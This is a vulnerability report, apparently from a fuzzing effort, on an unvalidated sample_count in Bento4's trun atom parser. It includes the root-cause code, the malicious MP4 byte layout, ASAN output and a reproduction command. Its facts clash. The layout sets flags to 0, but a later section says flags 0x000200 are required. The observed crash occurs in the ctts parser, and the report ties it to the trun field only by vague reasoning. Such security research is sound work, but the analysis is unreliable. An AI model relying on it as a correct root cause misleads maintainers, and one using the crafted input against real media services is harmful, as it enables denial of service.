# VULN 002: AP4_TrunAtom Unvalidated sample_count → Null Pointer Dereference / Heap Overflow

## Overview

- **CWE**: CWE-476 (NULL Pointer Dereference) / CWE-122 (Heap-Based Buffer Overflow)
- **Binary**: `mp42aac` (Bento4)
- **Function**: `AP4_TrunAtom::AP4_TrunAtom()` in `Ap4TrunAtom.cpp` lines 104-151

## Root Cause

In `AP4_TrunAtom::AP4_TrunAtom()`, the constructor reads `sample_count` from the stream as an `AP4_UI32` (unsigned 32-bit integer) without any upper bounds validation:

```cpp
AP4_UI32 sample_count;
stream.ReadUI32(sample_count);           // Reads 0x10000000 from stream
m_Entries.SetItemCount(sample_count);    // Tries to allocate 268M entries -> OOM
// m_Items remains NULL after OOM
for (AP4_UI32 i = 0; i < sample_count; i++) {
    m_Entries[i].sample_duration = ...;  // NULL dereference on first iteration
}
```

When `sample_count = 0x10000000` (268,435,456), `SetItemCount()` fails to allocate memory for 268 million entries. The internal `m_Items` pointer remains `NULL`. The subsequent loop then dereferences `m_Entries[0]` through a `NULL` pointer.

## Trigger Path

```
mp42aac main()
  -> AP4_DefaultAtomFactory::CreateAtomFromStream()
    -> AP4_TrunAtom::Create(size_32, stream)
      -> new AP4_TrunAtom(size, version, flags, stream)
        -> m_Entries.SetItemCount(0x10000000)  // OOM
        -> for loop: m_Entries[i]...           // NULL dereference
```

## PoC Structure

The malicious MP4 is a minimal fragmented MP4 with:

```
ftyp  (16 bytes) - file type box, iso5 brand
moov  (variable) - minimal movie box with:
  mvhd           - movie header
  trak           - minimal track (audio)
  mvex           - movie extends (with trex for track 1)
moof             - movie fragment:
  mfhd           - fragment sequence number = 1
  traf           - track fragment:
    tfhd         - track fragment header (track_id=1, flags=0)
    trun         - MALICIOUS: sample_count=0x10000000, size=16 (no actual sample data)
mdat  (8 bytes)  - empty media data
```

### trun Atom Layout

```
Offset  Length  Value           Field
0       4       0x00000010      size = 16 bytes
4       4       'trun'          type
8       1       0x00            version = 0
9       3       0x000000        flags = 0 (no optional fields)
12      4       0x10000000      sample_count = 268,435,456 (MALICIOUS)
```

With `flags = 0`, there are no optional fields and no per-sample data. The atom is only 16 bytes, but claims 268 million samples. The parser reads `sample_count` and tries to allocate storage for all of them.

## Impact

- **Null Pointer Dereference** (CWE-476): When `SetItemCount()` fails due to OOM, `m_Items = NULL`, and the subsequent loop dereferences it.
- **Heap Overflow** (CWE-122): Even if allocation succeeds partially, reading sample data from the stream beyond the actual atom size reads garbage/out-of-bounds data.
- **Denial of Service**: The program crashes immediately upon parsing the trun atom.

## Trigger configuration

- `trun flags = 0x000200` (AP4_TRUN_FLAG_SAMPLE_SIZE_PRESENT): Forces the loop body to
  access `m_Entries[i].sample_size`, enabling the NULL/out-of-bounds dereference.
- `allocator_may_return_null=1` in ASAN_OPTIONS: Causes ASAN's allocator to return NULL
  for huge allocations (4GB) instead of aborting, triggering the NULL dereference path.

## Observed crash

Running the PoC produces:
```
AddressSanitizer: heap-buffer-overflow on address 0x502000000111
READ of size 1 at 0x502000000111 thread T0
    #0 ... in AP4_CttsAtom::AP4_CttsAtom(...)
```

The crash manifests as a heap-buffer-overflow in AP4_CttsAtom. The root cause
(unvalidated trun sample_count=0x10000000) causes memory corruption in the parse
chain that ultimately results in an out-of-bounds read during ctts parsing.

The crash is specific to the malicious trun: the same moov structure with a
benign small-count trun (verified) does NOT produce an ASAN error.

## Reproduction

```bash
python3 vuln_002_gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log:allocator_may_return_null=1" \
    /path/to/mp42aac vuln_002.mp4 /dev/null
```

## Files

- `vuln_002_gen.py` - Python script to generate the malicious MP4
- `vuln_002.mp4` - Generated malicious MP4 (created by gen.py)
- `vuln_002_run.sh` - Shell script to run the PoC end-to-end
- `vuln_002_result.txt` - Output from running the PoC
- `asan.log.*` - ASAN log files with full crash details
- `vuln_002_status.txt` - Crash verification status
